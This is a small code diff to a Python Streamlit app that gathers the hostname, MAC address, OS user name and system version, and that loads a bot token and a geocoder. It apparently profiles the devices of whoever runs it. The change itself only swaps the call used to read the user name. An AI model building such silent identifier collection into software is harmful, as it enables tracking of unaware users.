@@ -11,6 +11,8 @@ import uuid
 import platform
 from geopy.geocoders import Nominatim
 import streamlit as st
+import getpass
+
 
 
 bot_token = st.secrets["BOT_TOKEN"]
@@ -40,7 +42,7 @@ def get_device_info():
     hostname = socket.gethostname()
     mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                     for ele in range(0,8*6,8)][::-1])
-    user = os.getlogin() if hasattr(os, "getlogin") else "Unknown"
+    user = getpass.getuser()
     system = platform.system()
     release = platform.release()
     return f"Hostname: {hostname}\nMAC: {mac}\nOS User: {user}\nSystem: {system} {release}"
